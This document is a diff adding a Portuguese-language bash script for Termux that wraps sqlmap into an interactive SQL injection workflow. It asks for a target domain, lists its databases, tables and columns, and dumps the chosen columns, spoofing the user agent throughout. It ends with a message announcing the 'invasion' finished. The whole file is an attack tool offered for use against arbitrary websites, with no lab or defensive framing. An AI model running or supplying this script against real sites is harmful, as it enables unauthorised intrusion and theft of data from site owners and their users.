@@ -1,0 +1,35 @@
+                                                                                                       Modified
+#!/bin/bash
+s
+#script desenvolvido por Linex Fundador da Gray root
+clear
+echo -e "\033[01;32mInsira Seu Nome de Usuario: \033[01;37m"
+read user
+echo -e "\033[01;32m*******************************\033[01;37m"
+echo -e "\033[01;36m Bem Vindo ao Script Sr $user \033[01;37m"
+echo -e "\033[01;32m*******************************\033[01;37m"
+cd /data/data/com.termux/files/home/sqlmap
+
+echo -e "\033[01;33mCole o dominio desejado:\033[01;37m"
+read url
+python2 sqlmap.py -u $url --dbs --random-agent
+echo -e "\033[01;34mAlguma Data Base Foi encontrada?(Y/n):\033[01;37m"
+read base
+if [ "$base" == "Y" ]; then
+        echo -e "\033[01;32mProcurando Por Databases...\033[01;37m"
+        sleep 4
+        else
+        echo -e "\033[01;31mA Injeçao Nao Pode Ser Concluida :/ \033[01;37m"
+        exit
+fi
+echo -e "\033[01;32mEscolha Uma Database:\033[01;37m"
+read database
+python2 sqlmap.py -u $url -D $database --tables --random-agent
+echo -e "\033[01;32mEscolha Uma Tabela:\033[01;37m"
+read  table
+python2 sqlmap.py -u $url -D $database -T $table --columns --random-agent
+echo -e "\033[01;32mQual(is) Coluna(as) deseja escolher?:\033[01;37m"
+read colum
+python2 sqlmap.py -u $url -D $database -T $table -C $colum --dump --random-agent
+echo -e "\033[01;36mInvasao finalizada !! Obrigado por utilizar este script :)  \033[01;37m"
+echo
